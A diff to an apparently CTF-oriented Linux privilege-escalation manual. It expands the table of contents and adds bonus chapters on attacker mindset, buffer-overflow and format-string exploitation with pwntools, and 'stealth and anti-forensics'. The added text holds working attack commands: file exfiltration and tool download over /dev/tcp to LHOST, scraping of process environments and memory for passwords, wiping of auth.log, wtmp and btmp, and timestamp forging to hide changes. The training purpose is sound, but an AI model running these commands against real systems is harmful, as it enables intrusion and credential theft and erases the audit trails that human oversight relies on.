@@ -36,74 +36,202 @@ This manual is written for:
 
 ---
 
-## 📚 Table of Contents
+## 📚 Interactive Table of Contents
 
-```
-PART 0   — INITIAL ACCESS (Starting From Nothing)
-  Chapter 0  — The Methodology: From IP to Shell
-  Chapter 0a — Reconnaissance & Service Discovery
-  Chapter 0b — Web Application Initial Access
-  Chapter 0c — Service Exploitation for Initial Access
-  Chapter 0d — Credential Attacks & Password Spraying
-  Chapter 0e — Phishing & Client-Side Attacks (Overview)
+> **HOW TO NAVIGATE:** Every heading below is a clickable link. In any Markdown viewer (Obsidian, GitHub, VS Code Preview, Typora, Joplin) clicking a link jumps directly to that section. Use `Ctrl+F` / `Cmd+F` to search anywhere in the document. Each Part header acts as a bookmark.
 
-PART I   — FOUNDATIONS
-  Chapter 1  — Understanding Linux Privilege Model
-  Chapter 2  — Enumeration: The Art of Reconnaissance
-  Chapter 3  — Essential Tools & Commands Deep Dive
+---
 
-PART II  — SHELL FUNDAMENTALS
-  Chapter 4  — Getting a Shell: Every Method
-  Chapter 5  — Reverse Shells: Every Language & Case
-  Chapter 6  — Shell Stabilization & Upgrading
-  Chapter 7  — Bind Shells, Web Shells & Special Cases
+### 🔴 PART 0 — INITIAL ACCESS (Zero to Foothold)
+- [Chapter 0 — The Methodology: From IP to Shell](#chapter-0-the-methodology--from-ip-to-shell)
+- [Chapter 0a — Reconnaissance & Service Discovery](#chapter-0a-reconnaissance--service-discovery)
+  - [0a.1 What is Reconnaissance?](#0a1-what-is-reconnaissance)
+  - [0a.2 Nmap — The Complete Reference](#0a2-nmap--the-complete-reference)
+  - [0a.3 Understanding Nmap Output — What To Do With Each Service](#0a3-understanding-nmap-output--what-to-do-with-each-service)
+  - [0a.4 Passive Reconnaissance](#0a4-passive-reconnaissance)
+- [Chapter 0b — Web Application Initial Access](#chapter-0b-web-application-initial-access)
+  - [0b.1 Why Web Apps Are the #1 Entry Point](#0b1-why-web-apps-are-the-1-entry-point)
+  - [0b.2 Web Application Enumeration](#0b2-web-application-enumeration)
+  - [0b.3 Common Web Vulnerabilities for Initial Access](#0b3-common-web-vulnerabilities-for-initial-access)
+    - [SQL Injection to RCE](#0b31-sql-injection-to-rce)
+    - [LFI / RFI to Shell](#0b32-local-file-inclusion-lfi-to-shell)
+    - [Command Injection](#0b34-command-injection)
+    - [File Upload Bypass](#0b35-file-upload-vulnerabilities)
+    - [Default Credentials](#0b36-default-credentials)
+- [Chapter 0c — Service Exploitation for Initial Access](#chapter-0c-service-exploitation-for-initial-access)
+  - [0c.1 FTP Exploitation](#0c1-ftp-exploitation)
+  - [0c.2 SMB / Samba Exploitation](#0c2-smb--samba-exploitation)
+  - [0c.3 SMTP User Enumeration](#0c3-smtp-user-enumeration)
+  - [0c.4 SNMP Information Disclosure](#0c4-snmp-information-disclosure)
+- [Chapter 0d — Credential Attacks & Password Spraying](#chapter-0d-credential-attacks--password-spraying)
+  - [0d.1 Password Spraying Theory](#0d1-password-spraying-theory)
+  - [0d.2 Building Wordlists](#0d2-building-wordlists)
+  - [0d.3 Hydra — Complete Reference](#0d3-hydra--complete-reference)
+  - [0d.4 What To Do When You Have Credentials](#0d4-what-to-do-when-you-have-credentials)
 
-PART III — ENVIRONMENT VARIABLES & PATH EXPLOITATION
-  Chapter 8  — Environment Variables: Complete Guide
-  Chapter 9  — PATH Hijacking & Library Injection
-  Chapter 10 — LD_PRELOAD, LD_LIBRARY_PATH Exploitation
+---
 
-PART IV  — FILE PERMISSION EXPLOITATION
-  Chapter 11 — SUID/SGID Binaries: Full Exploitation
-  Chapter 12 — Capabilities Exploitation
-  Chapter 13 — Writable Files & Cron Jobs
-  Chapter 14 — Weak File Permissions
+### 🟡 PART I — FOUNDATIONS
+- [Chapter 1 — Understanding the Linux Privilege Model](#chapter-1-understanding-the-linux-privilege-model)
+  - [1.1 The Linux User & Permission Model](#11-the-linux-user--permission-model)
+  - [1.2 How Privilege Escalation Works](#12-how-privilege-escalation-works)
+  - [1.3 Linux Authentication Files](#13-linux-authentication-files)
+- [Chapter 2 — Enumeration: The Art of Reconnaissance](#chapter-2-enumeration--the-art-of-reconnaissance)
+  - [2.1 Why Enumeration is Everything](#21-why-enumeration-is-everything)
+  - [2.2 System Information Gathering](#22-system-information-gathering)
+  - [2.3 User & Group Enumeration](#23-user--group-enumeration)
+  - [2.4 File System Enumeration](#24-file-system-enumeration)
+  - [2.5 Automated Enumeration Tools](#25-automated-enumeration-tools)
+- [Chapter 3 — Essential Tools & Commands Deep Dive](#chapter-3-essential-tools--commands-deep-dive)
+  - [3.1 The find Command — Master Reference](#31-the-find-command--master-reference)
+  - [3.2 The grep Command — Master Reference](#32-the-grep-command--master-reference)
+  - [3.3 Other Essential Commands](#33-other-essential-commands)
 
-PART V   — SUDO EXPLOITATION
-  Chapter 15 — Sudo Misconfigurations
-  Chapter 16 — Sudo Version Vulnerabilities
-  Chapter 17 — Sudoers File Deep Dive
+---
 
-PART VI  — KERNEL & OS EXPLOITATION
-  Chapter 18 — Kernel Exploits
-  Chapter 19 — NFS Exploitation
-  Chapter 20 — Shared Libraries & Linker
+### 🟢 PART II — SHELL FUNDAMENTALS
+- [Chapter 4 — Getting a Shell: Every Method](#chapter-4-getting-a-shell--every-method)
+- [Chapter 5 — Reverse Shells: Every Language & Case](#chapter-5-reverse-shells--every-language--case)
+  - [5.1 How a Reverse Shell Works (Theory)](#51-how-a-reverse-shell-works-theory)
+  - [5.2 Bash Reverse Shells](#52-bash-reverse-shells)
+  - [5.3 Python Reverse Shells](#53-python-reverse-shells)
+  - [5.4 PHP Reverse Shells](#54-php-reverse-shells)
+  - [5.5 Perl Reverse Shell](#55-perl-reverse-shell)
+  - [5.6 Ruby Reverse Shell](#56-ruby-reverse-shell)
+  - [5.7 C/C++ Reverse Shell](#57-cc-reverse-shell)
+  - [5.8 Netcat Reverse Shells](#58-netcat-reverse-shells)
+  - [5.9 Java Reverse Shell](#59-java-reverse-shell)
+  - [5.10 Socat Reverse Shell (Best Quality)](#510-socat-reverse-shell-best-quality)
+  - [5.11 MSFvenom Payloads](#511-msfvenom-payloads)
+- [Chapter 6 — Shell Stabilization & Upgrading](#chapter-6-shell-stabilization--upgrading)
+  - [6.2 Python PTY Method](#62-method-1-python-pty-most-common)
+  - [6.3 Socat Upgrade](#63-method-2-socat-upgrade-best)
+  - [6.7 SSH Upgrade](#67-method-6-ssh-upgrade-best-for-persistence)
+- [Chapter 7 — Bind Shells, Web Shells & Named Pipe Shells](#chapter-7-bind-shells-web-shells--named-pipe-shells)
 
-PART VII — SERVICE & NETWORK EXPLOITATION
-  Chapter 21 — SSH: Full Pentesting Guide
-  Chapter 22 — Cron Job Exploitation (Advanced)
-  Chapter 23 — Running Services & Internal Ports
-  Chapter 24 — MySQL/PostgreSQL/Redis Exploitation
+---
 
-PART VIII — ADVANCED TECHNIQUES
-  Chapter 25 — Container Escapes (Docker/LXC/LXD)
-  Chapter 26 — Wildcard Injection
-  Chapter 27 — Python/Perl/Ruby Script Exploitation
-  Chapter 28 — Passwd/Shadow File Attacks
-  Chapter 29 — Shared Object Hijacking & RPATH
-  Chapter 30 — Logrotate, Systemd, Timer Exploitation
+### 🔵 PART III — ENVIRONMENT VARIABLES & PATH EXPLOITATION
+- [Chapter 8 — Environment Variables: Complete Guide](#chapter-8-environment-variables--complete-guide)
+  - [8.2 Critical Env Vars for Privilege Escalation](#82-critical-environment-variables-for-privilege-escalation)
+    - [PATH](#821-path)
+    - [LD_PRELOAD](#822-ld_preload)
+    - [LD_LIBRARY_PATH](#823-ld_library_path)
+    - [Other Exploitable Variables (PYTHONPATH, BASH_ENV, PS4...)](#824-other-exploitable-environment-variables)
+  - [8.3 Complete Environment Variable Reference](#83-complete-environment-variable-reference)
+- [Chapter 9 — PATH Hijacking](#chapter-9-path-hijacking)
+- [Chapter 10 — LD_PRELOAD, LD_LIBRARY_PATH Exploitation](#chapter-10-ld_preload-ld_library_path-exploitation)
 
-PART IX  — NETCAT & PIVOTING
-  Chapter 31 — Netcat: The Complete Guide
-  Chapter 32 — Port Forwarding & Tunneling
-  Chapter 33 — Pivoting Through Compromised Hosts
+---
 
-PART X   — CHECKLISTS & QUICK REFERENCE
-  Chapter 34 — Full Enumeration Checklist
-  Chapter 35 — Command Reference Card
-  Chapter 36 — CTF Methodology Flow & Decision Tree
-  Chapter 37 — Wordlists, Tools & Resources
-```
+### 🟠 PART IV — FILE PERMISSION EXPLOITATION
+- [Chapter 11 — SUID/SGID Binaries: Full Exploitation](#chapter-11-suidsgid-binaries--full-exploitation)
+  - [11.2 Finding and Researching SUID Binaries](#112-finding-and-researching-suid-binaries)
+  - [11.3 GTFOBins — The SUID Bible](#113-gtfobins--the-suid-bible)
+    - [bash/sh](#1131-bash--sh) | [find](#1132-find) | [vim/vi](#1133-vim--vi) | [python](#1134-python--python3) | [perl](#1135-perl) | [ruby](#1136-ruby) | [nmap](#1137-nmap) | [less/more](#1138-less--more) | [nano](#1139-nano) | [cp/mv](#11310-cp--mv) | [chmod](#11311-chmod) | [tar](#11312-tar) | [awk](#11313-awk) | [wget/curl](#11315-wget--curl)
+- [Chapter 12 — Capabilities Exploitation](#chapter-12-linux-capabilities)
+  - [12.2 Finding Files with Capabilities](#122-finding-files-with-capabilities)
+  - [12.3 Exploiting Dangerous Capabilities](#123-exploiting-dangerous-capabilities)
+- [Chapter 13 — Writable Files & Cron Jobs](#chapter-13-writable-files--cron-job-exploitation)
+- [Chapter 14 — Weak File Permissions](#chapter-14-weak-file-permissions)
+
+---
+
+### 🔴 PART V — SUDO EXPLOITATION
+- [Chapter 15 — Sudo Misconfigurations](#chapter-15-sudo-misconfigurations)
+  - [15.3 Sudo Exploitation by Binary (GTFOBins)](#153-sudo-exploitation-by-binary)
+  - [15.4 The ! Bypass (CVE-2019-14287)](#154-the--bypass-cve-2019-14287)
+- [Chapter 16 — Sudo Version Vulnerabilities](#chapter-16-sudo-version-vulnerabilities)
+  - [16.1 Baron Samedit (CVE-2021-3156)](#161-baron-samedit-cve-2021-3156)
+- [Chapter 17 — Sudoers File: Deep Dive](#chapter-17-sudoers-file--deep-dive)
+
+---
+
+### ⚫ PART VI — KERNEL & OS EXPLOITATION
+- [Chapter 18 — Kernel Exploits](#chapter-18-kernel-exploits)
+  - [18.4 Dirty COW (CVE-2016-5195)](#184-dirty-cow-cve-2016-5195)
+  - [18.5 PwnKit (CVE-2021-4034)](#185-pwnkit-cve-2021-4034)
+  - [18.6 DirtyPipe (CVE-2022-0847)](#186-dirtypipe-cve-2022-0847)
+- [Chapter 19 — NFS Exploitation](#chapter-19-nfs-exploitation)
+  - [19.4 NFS Privilege Escalation — Step by Step](#194-nfs-privilege-escalation--step-by-step)
+- [Chapter 20 — Shared Libraries & Dynamic Linker](#chapter-20-shared-libraries--dynamic-linker)
+
+---
+
+### 🟣 PART VII — SERVICE & NETWORK EXPLOITATION
+- [Chapter 21 — SSH: Full Pentesting Guide](#chapter-21-ssh--full-pentesting-guide)
+  - [21.2 SSH Brute Force](#212-ssh-brute-force)
+  - [21.3 SSH Key Attacks](#213-ssh-key-attacks)
+  - [21.6 SSH Port Forwarding & Tunneling](#216-ssh-port-forwarding--tunneling)
+- [Chapter 22 — Cron Job Exploitation (Advanced)](#chapter-22-cron-job-exploitation-advanced)
+- [Chapter 23 — Internal Services Exploitation](#chapter-23-internal-services-exploitation)
+- [Chapter 24 — MySQL/PostgreSQL/Redis Exploitation](#chapter-23-internal-services-exploitation)
+
+---
+
+### 🟡 PART VIII — ADVANCED TECHNIQUES
+- [Chapter 25 — Container Escapes (Docker/LXC/LXD)](#chapter-25-docker-container-escapes)
+  - [25.2 Privileged Container Escape](#252-privileged-container-escape)
+  - [25.3 Docker Socket Escape](#253-docker-socket-escape)
+  - [25.4 LXC/LXD Container Escape](#254-lxclxd-container-escape)
+- [Chapter 26 — Wildcard Injection](#chapter-26-wildcard-injection-advanced)
+  - [26.2 tar Wildcard Exploitation](#262-complete-tar-wildcard-exploitation)
+- [Chapter 27 — Python/Perl/Ruby Script Exploitation](#chapter-27-python-perl-ruby-script-exploitation)
+- [Chapter 28 — /etc/passwd and /etc/shadow Attacks](#chapter-28-etcpasswd-and-etcshadow-attacks--deep-dive)
+- [Chapter 29 — Shared Object Hijacking & RPATH](#chapter-29-shared-object-hijacking--rpath)
+- [Chapter 30 — Logrotate, Systemd & Timer Exploitation](#chapter-30-logrotate-systemd-timer--service-exploitation)
+
+---
+
+### 🔵 PART IX — NETCAT & PIVOTING
+- [Chapter 31 — Netcat: The Complete Guide](#chapter-29-netcat--the-complete-guide)
+  - [31.2 Netcat Complete Flag Reference](#292-netcat-complete-flag-reference)
+  - [31.3 Netcat File Transfer](#293-netcat-file-transfer)
+  - [31.7 Alternatives When nc Is Not Available](#297-alternatives-when-nc-is-not-available)
+- [Chapter 32 — Port Forwarding & Tunneling](#chapter-30-port-forwarding--tunneling)
+  - [32.1 SSH Local Port Forwarding](#301-ssh-local-port-forwarding)
+  - [32.2 SSH Dynamic (SOCKS) Forwarding](#302-ssh-dynamic-socks-forwarding)
+  - [32.3 Chisel (Modern Tunneling Tool)](#303-chisel-modern-tunneling-tool)
+
+---
+
+### 🟢 PART X — CHECKLISTS & QUICK REFERENCE
+- [Chapter 33 — Credential Hunting: Every Place to Look](#chapter-33-credential-hunting--every-place-to-look)
+- [Chapter 34 — Full Enumeration Checklist](#chapter-34-full-enumeration-checklist)
+  - [34.1 Phase 1: First 2 Minutes (Immediate Wins)](#341-phase-1-immediate-first-2-minutes)
+  - [34.2 Phase 2: Thorough Enumeration](#342-phase-2-thorough-enumeration-next-10-minutes)
+  - [34.3 Phase 3: Deep Hunting](#343-phase-3-deep-hunting-remaining-time)
+- [Chapter 35 — Command Reference Card](#chapter-35-command-reference-card)
+- [Chapter 36 — CTF Methodology Flow & Decision Tree](#chapter-36-ctf-methodology-flow--decision-tree)
+- [Chapter 37 — Wordlists, Tools & Resources](#chapter-37-wordlists-tools--complete-resources)
+
+---
+
+### 🔴 PART XI — PRACTICE LABS & LEARNING METHODOLOGY
+- [Chapter 38 — How to Actually Learn Privilege Escalation](#chapter-38-how-to-actually-learn-privilege-escalation--the-right-method)
+  - [38.2 The Structured Learning Path](#382-the-structured-learning-path-beginner-to-advanced)
+  - [38.3 Personal Progress Tracker](#383-your-personal-progress-tracker)
+- [Chapter 39 — Universal Machine Methodology](#chapter-39-universal-machine-methodology--step-by-step)
+- [Chapter 40 — TryHackMe: Complete Free Room Guide](#chapter-40-tryhackme--complete-free-room-guide)
+- [Chapter 41 — HackTheBox: Complete Free Machine Guide](#chapter-41-hackthebox--complete-free-machine-guide)
+- [Chapter 42 — VulnHub: Best Free Offline VMs](#chapter-42-vulnhub--best-free-offline-practice-vms)
+- [Chapter 43 — The Learning Schedule & IppSec Method](#chapter-43-the-learning-methodology--detailed-answer)
+
+---
+
+### ⚡ BONUS CHAPTERS (What Puts You Ahead)
+- [Bonus A — The Mindset Edge: How Top Hackers Think Differently](#bonus-a--the-mindset-edge)
+- [Bonus B — Custom Exploit Development Basics](#bonus-b--custom-exploit-development-basics)
+- [Bonus C — Stealth & Anti-Forensics Techniques](#bonus-c--stealth--anti-forensics)
+- [Bonus D — Automation: Writing Your Own Enumeration Scripts](#bonus-d--automation-writing-your-own-enumeration-scripts)
+- [Bonus E — The Unknown Binary: How to Approach Anything](#bonus-e--the-unknown-binary-approach)
+- [Bonus F — Real CTF Case Studies & Full Walkthroughs](#bonus-f--real-ctf-case-studies)
+
+---
+
+> 💡 **TIP:** Render this file in **Obsidian** for the best experience — all links are clickable, code blocks are syntax-highlighted, and you can use graph view to see connections between topics. Also works in VS Code with Markdown Preview Enhanced, Typora, or GitHub.
+
+---
 
 ---
 
@@ -8556,9 +8684,1062 @@ One paragraph: what the machine was about, what techniques were used.
 
 ---
 
+# ⚡ BONUS CHAPTERS — What Puts You Ahead of Everyone Else
+
+> These chapters cover the techniques, mindset, and meta-skills that separate someone who can follow a walkthrough from someone who can solve any machine cold, write their own exploits, stay invisible, and build tools others don't have.
+
+---
+
+# Bonus A — The Mindset Edge
+
+## A.1 How the Top 1% of CTF Players Think Differently
+
+Most players think in terms of **tools**. The top players think in terms of **questions**.
+
+```
+Average player mindset:
+  "I ran linpeas. Now what do I do with the output?"
+  "I found a SUID binary — let me check GTFOBins."
+  "Sudo -l shows nothing — I'm stuck."
+
+Top player mindset:
+  "Why does this SUID binary exist? Who put it here? What does it DO?"
+  "GTFOBins has nothing on this binary — so what CAN this binary do?"
+  "Sudo -l shows nothing NOW — but what runs as root? What WILL run?"
+```
+
+The difference is **curiosity applied systematically**. Every finding is a question, not an answer.
+
+## A.2 The Five Questions That Unlock Every Box
+
+Before touching any tool, ask these about the machine:
+
+```
+1. WHAT runs as root on this machine?
+   → Processes, cron jobs, systemd services, scheduled tasks
+   → Answer: ps aux, pspy, systemctl, crontab
+
+2. WHAT can I write to that root will later read or execute?
+   → Cron scripts, config files, log files, library paths, PATH entries
+   → Answer: find / -writable + cross-reference with running processes
+
+3. WHAT executes my input without proper sanitization?
+   → Web forms, environment variables, filename handling, log entries
+   → Answer: test EVERY input with ; id and ../../../
+
+4. WHAT am I allowed to do that is more powerful than intended?
+   → Sudo rules, group memberships, capabilities, SUID ownership
+   → Answer: sudo -l, id, getcap -r /
+
+5. WHAT secrets has someone left behind?
+   → History files, config files, backup files, git repos, memory
+   → Answer: credential hunting (Chapter 33)
+```
+
+If you cannot answer all five after enumeration, you have not enumerated enough.
+
+## A.3 The "Assume Nothing" Principle
+
+```
+WRONG: "Port 22 is SSH. I can't do anything with SSH without credentials."
+RIGHT: "Port 22 is SSH. Let me check:
+        - What version? Any CVEs?
+        - Does it accept keys? Any public keys I can find?
+        - Can I enumerate users via timing attack?
+        - Is the default host key still in use?
+        - What ciphers are supported? (ssh-audit)
+        - Can it be used for tunneling once I'm inside?"
+
+WRONG: "I don't have sudo. That vector is closed."
+RIGHT: "Sudo -l requires no password to run — what does it show?
+        Is there a token cached? Can I read /run/sudo/ts/?
+        What will root execute NEXT? Can I intercept that execution?"
+
+WRONG: "The kernel is patched. Kernel exploits won't work."
+RIGHT: "The kernel is patched against known CVEs. Are there:
+        - Custom kernel modules loaded? (lsmod)
+        - Kernel parameters I can influence?
+        - Race conditions in the specific version?
+        - Unsigned modules that can be loaded?"
+```
+
+## A.4 Time Management During CTFs
+
+```
+FIRST 5 MINUTES: Breadth scan — find all attack surface
+  nmap -p- fast scan, start gobuster if HTTP, check obvious services
+
+NEXT 15 MINUTES: Initial access — what looks most promising?
+  Attack the highest-value target from your scan
+  If web: gobuster + whatweb + source code simultaneously
+
+NEXT 20 MINUTES: If stuck on initial access, try other services
+  Don't spend 45 minutes on one path — pivot after 20 min of nothing
+
+AFTER GETTING SHELL: 3 minutes of immediate wins
+  id, sudo -l, uname -r, env — these 4 lines take 10 seconds each
+
+PRIVESC: Work the decision tree, don't guess
+  Follow Chapter 36 exactly. Don't skip steps.
+
+IF COMPLETELY STUCK (30+ min after good enumeration):
+  1. Re-examine nmap output — did you miss a port?
+  2. Check vhosts — curl -H "Host: something.target.htb" TARGET
+  3. Run pspy — what is root executing right now?
+  4. Check /proc/net/tcp for listening services not visible via ss
+  5. Read every found file — not just the ones that look interesting
+```
+
+## A.5 Reading /proc Like a Pro
+
+`/proc` is a goldmine that most players ignore after the first week:
+
+```bash
+# Find ALL listening ports including those bound to localhost
+# (sometimes ss/netstat miss these or require root to show PID)
+cat /proc/net/tcp | awk 'NR>1 {print $2}' | while read hex; do
+    port=$(echo "obase=10; ibase=16; ${hex##*:}" | bc)
+    echo "Port: $port"
+done | sort -t: -k2 -n | uniq
+
+# Read any process's environment (root processes included if world-readable!)
+for pid in /proc/[0-9]*/environ; do
+    echo "=== $pid ==="
+    cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|key|token"
+done
+
+# See what files every process has open
+ls -la /proc/*/fd 2>/dev/null | grep -v "^total\|^d" | head -50
+
+# Read command line of all processes (reveals passwords passed as args!)
+for pid in /proc/[0-9]*/cmdline; do
+    content=$(cat "$pid" 2>/dev/null | tr '\0' ' ')
+    echo "$content" | grep -iE "pass|secret|key|token|--password|-p " && echo "  ^ from $pid"
+done
+
+# Check memory maps for loaded libraries (find custom libs)
+cat /proc/$(pgrep -f "interesting_process")/maps 2>/dev/null
+
+# Read process memory directly (if permissions allow)
+pid=$(pgrep mysqld)
+cat /proc/$pid/mem 2>/dev/null | strings | grep -i "password" | head -10
+```
+
+---
+
+# Bonus B — Custom Exploit Development Basics
+
+## B.1 When to Write Your Own Exploit
+
+You need custom exploit skills when:
+- The binary is completely custom (no CVE exists)
+- The exploit exists but targets a different version/offset
+- You found a vulnerability through source code review
+- The existing PoC is broken and needs fixing
+
+## B.2 Buffer Overflow Basics (Stack-Based)
+
+```bash
+# Step 1: Check if binary is vulnerable to overflow
+# Send increasing lengths of input until crash:
+python3 -c 'print("A" * 100)' | ./vulnerable_binary
+python3 -c 'print("A" * 500)' | ./vulnerable_binary
+python3 -c 'print("A" * 1000)' | ./vulnerable_binary
+# If it crashes with a long input: likely buffer overflow!
+
+# Step 2: Find exact crash offset using cyclic pattern (pwntools):
+python3 -c "
+from pwn import *
+pattern = cyclic(500)
+print(pattern.decode())
+" | ./vulnerable_binary
+# Note the value in EIP/RIP when it crashes
+
+# Step 3: Find the offset:
+python3 -c "
+from pwn import *
+# Replace with the EIP value you saw at crash:
+offset = cyclic_find(0x61616175)
+print(f'Offset: {offset}')
+"
+
+# Step 4: Check binary protections:
+checksec --file=./vulnerable_binary
+# NX disabled + No PIE + No canary = classic ret2shellcode
+# NX enabled = need ROP chain
+# ASLR: check /proc/sys/kernel/randomize_va_space
+
+# Step 5: Find gadgets for ROP if needed:
+ROPgadget --binary ./vulnerable_binary | grep "pop rdi"
+ropper -f ./vulnerable_binary --search "pop rdi"
+```
+
+## B.3 Format String Vulnerabilities
+
+```bash
+# Detection: does the program print your input directly?
+echo "%x %x %x %x" | ./vulnerable_binary
+# If you see hex values instead of literal "%x": FORMAT STRING BUG!
+
+# Read arbitrary memory (find stack values, canaries, pointers):
+echo "%1\$x %2\$x %3\$x %4\$x %5\$x %6\$x %7\$x %8\$x" | ./binary
+
+# Read a specific address (AAAA = 0x41414141 as marker):
+python3 -c 'import sys; sys.stdout.buffer.write(b"AAAA" + b".%x" * 20 + b"\n")' | ./binary
+# Count the positions until you see 41414141 — that's your offset
+
+# Write to arbitrary address (overwrite GOT entry, return address, etc.):
+# This requires pwntools for practical use:
+python3 << 'EOF'
+from pwn import *
+
+p = process('./vulnerable_binary')
+# Write 0x1337 to address 0x804a010:
+target = 0x804a010
+value = 0x1337
+payload = fmtstr_payload(6, {target: value})
+p.sendline(payload)
+p.interactive()
+EOF
+```
+
+## B.4 Using pwntools for Exploit Development
+
+```python
+#!/usr/bin/env python3
+# skeleton_exploit.py — template for binary exploitation
+from pwn import *
+
+# Target configuration
+binary = './vulnerable_binary'
+elf = ELF(binary)
+context.binary = elf
+context.arch = 'amd64'   # or 'i386'
+# context.log_level = 'debug'  # Uncomment for verbose output
+
+# Remote or local?
+def get_target():
+    if args.REMOTE:
+        return remote('TARGET_IP', PORT)
+    else:
+        return process(binary)
+
+p = get_target()
+
+# Useful pwntools helpers:
+# p.recvline()          — receive one line
+# p.recvuntil(b":")     — receive until pattern
+# p.send(payload)       — send without newline
+# p.sendline(payload)   — send with newline
+# p.interactive()       — manual interaction mode
+# p64(address)          — pack 64-bit little-endian address
+# p32(address)          — pack 32-bit little-endian address
+# u64(bytes)            — unpack 64-bit address
+# asm(shellcode)        — assemble shellcode
+
+# Basic buffer overflow template:
+offset = 40  # Find this with cyclic pattern
+ret_addr = p64(0xdeadbeef)  # Address to jump to
+
+payload = b"A" * offset
+payload += ret_addr
+
+p.sendline(payload)
+p.interactive()
+```
+
+## B.5 Shellcode Basics
+
+```python
+# Generate shellcode with pwntools:
+from pwn import *
+context.arch = 'amd64'
+context.os = 'linux'
+
+# Spawn /bin/sh:
+shellcode = asm(shellcraft.sh())
+print(shellcode.hex())
+
+# Or use msfvenom:
+# msfvenom -p linux/x64/exec CMD=/bin/bash -f python
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw | xxd
+
+# Test shellcode locally:
+from pwn import *
+context.arch = 'amd64'
+shellcode = asm(shellcraft.sh())
+# Run it in a process:
+p = process('/bin/bash')  # Replace with target
+p.sendline(shellcode)
+p.interactive()
+```
+
+---
+
+# Bonus C — Stealth & Anti-Forensics
+
+## C.1 Covering Your Tracks (Post-Exploitation)
+
+> Note: These techniques are documented for defensive awareness — understanding what attackers do helps defenders detect it. Only use on authorized targets.
+
+```bash
+# ===== HIDING YOUR PRESENCE =====
+
+# Clear your bash history:
+history -c && history -w    # Clear in-memory + write empty to file
+unset HISTFILE               # Stop logging history for this session
+export HISTSIZE=0            # No history stored
+export HISTFILESIZE=0
+
+# More thorough:
+cat /dev/null > ~/.bash_history
+ln -sf /dev/null ~/.bash_history   # Link history to /dev/null permanently
+
+# Remove specific lines from history:
+history -d LINE_NUMBER       # Delete specific history entry
+
+# Run commands without them appearing in history:
+ command_here               # Leading space (if HISTCONTROL=ignorespace)
+HISTFILE=/dev/null bash      # Spawn shell with no history
+
+# ===== CLEARING LOGS =====
+
+# Clear auth.log (SSH logins, sudo usage):
+echo "" > /var/log/auth.log
+> /var/log/auth.log          # Same effect
+
+# Clear specific entries (more surgical):
+grep -v "your_username\|your_ip" /var/log/auth.log > /tmp/clean.log
+mv /tmp/clean.log /var/log/auth.log
+
+# Watch logs in real time to know what's being written:
+tail -f /var/log/auth.log
+tail -f /var/log/syslog
+
+# Files you should clear after a pentest (with permission):
+/var/log/auth.log
+/var/log/syslog
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/wtmp       # Login records (last command reads this)
+/var/log/btmp       # Failed login attempts
+/var/run/utmp       # Currently logged in users (who reads this)
+~/.bash_history
+~/.zsh_history
+/tmp/*              # Any files you dropped
+
+# Clear wtmp/btmp (binary files — use this):
+> /var/log/wtmp
+> /var/log/btmp
+
+# ===== AVOIDING DETECTION =====
+
+# Rename your tools to blend in:
+cp linpeas.sh /tmp/update.sh
+cp pspy64 /tmp/systemd-check
+
+# Work in /dev/shm (RAM — doesn't survive reboot, no disk I/O):
+cd /dev/shm
+wget http://LHOST:8000/tool -O /dev/shm/tool
+chmod +x /dev/shm/tool
+./tool
+# After you're done: it disappears on reboot automatically
+
+# Run processes that blend in:
+bash --norc --noprofile          # Looks like a normal bash
+python3 -c "import time; time.sleep(99999)" &   # Looks innocuous
+
+# Timestamps — restore file timestamps after modification:
+# Before modifying a file, note its timestamp:
+stat /etc/crontab   # Note: Access, Modify, Change times
+
+# After modifying, restore the timestamp:
+touch -r /etc/hosts /etc/crontab   # Copy timestamp from /etc/hosts
+touch -t 202301011200 /etc/crontab  # Set specific timestamp
+# (Format: YYYYMMDDhhmm)
+
+# ===== WHAT DEFENDERS LOOK FOR =====
+# Understanding this helps you on both sides:
+
+# Unusual SUID files (defenders run):
+find / -perm -4000 -newer /tmp -type f 2>/dev/null
+
+# Recently modified system files:
+find /etc /bin /usr/bin -mtime -1 2>/dev/null
+
+# Unusual listening ports:
+ss -tulpn | grep LISTEN
+
+# Users with root shell (UID 0):
+awk -F: '$3 == 0' /etc/passwd
+
+# Cron jobs added recently:
+find /etc/cron* /var/spool/cron -newer /etc/passwd 2>/dev/null
+
+# New users:
+awk -F: '$3 >= 1000' /etc/passwd   # Regular users
+```
+
+## C.2 Living Off The Land (LOLBins)
+
+Use tools already on the system to avoid uploading suspicious binaries:
+
+```bash
+# File transfer without wget/curl:
+# Using /dev/tcp:
+cat < /dev/tcp/LHOST/PORT > /tmp/received_file   # Receive a file
+cat file.txt > /dev/tcp/LHOST/PORT               # Send a file
+
+# Using python (already installed):
+python3 -m http.server 8080    # Serve files from current directory
+python3 -c "
+import urllib.request
+urllib.request.urlretrieve('http://LHOST/tool', '/tmp/tool')
+"
+
+# Using perl:
+perl -e 'use LWP::Simple; getstore("http://LHOST/tool", "/tmp/tool");'
+
+# Using bash + /dev/tcp (no external tools):
+exec 3<>/dev/tcp/LHOST/8000
+echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" >&3
+cat <&3 | sed '1,/^\r$/d' > /tmp/linpeas.sh
+
+# Base64 encode/decode for binary transfer via copy-paste:
+# On attacker: base64 -w0 tool > tool.b64
+# On victim: echo "BASE64..." | base64 -d > /tmp/tool
+
+# Compress before encoding (larger files):
+# gzip -c tool | base64 -w0 > tool.gz.b64
+# echo "BASE64..." | base64 -d | gunzip > /tmp/tool
+```
+
+---
+
+# Bonus D — Automation: Writing Your Own Enumeration Scripts
+
+## D.1 Why Write Your Own Scripts?
+
+Public tools like linpeas are known to defenders. Custom scripts:
+- Evade signature-based detection
+- Do exactly what YOU need, nothing else
+- Teach you deeply what you're looking for
+- Can be optimized for speed
+
+## D.2 Your Personal Quick Enum Script
+
+Build this up over time, adding things you find yourself reaching for:
+
+```bash
+#!/bin/bash
+# myenum.sh — your personal quick enumeration script
+# Add to this every time you find yourself typing the same thing twice
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+banner() { echo -e "\n${CYAN}════════════════════════════════${NC}"; echo -e "${YELLOW}  $1${NC}"; echo -e "${CYAN}════════════════════════════════${NC}"; }
+found() { echo -e "${RED}[!] FOUND: $1${NC}"; }
+info() { echo -e "${GREEN}[*] $1${NC}"; }
+
+banner "IDENTITY"
+id; whoami; groups
+echo ""
+
